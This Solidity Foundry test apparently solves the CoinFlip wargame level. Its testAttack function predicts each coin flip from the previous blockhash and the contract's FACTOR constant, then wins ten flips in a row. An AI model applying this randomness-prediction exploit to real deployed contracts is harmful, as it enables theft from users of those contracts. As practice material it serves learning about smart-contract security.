// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/CoinFlip.sol";

contract CoinFlipTest is Test {
    CoinFlip public target;
    address player;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 rollnumber = 1;
    function setUp() public {
        target = new CoinFlip();
        vm.deal(player, 100 ether);
    }

    function testAttack() public {
        vm.startPrank(player);
        for(uint i = 0; i < 10; ++i) {
            vm.roll(rollnumber);
            rollnumber += 1;
            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 coinFlip = blockValue / FACTOR;
            bool side = coinFlip == 1 ? true : false;
            require(target.flip(side), "guess failed");
        }
        emit log_named_uint("res", target.consecutiveWins());
    }
}
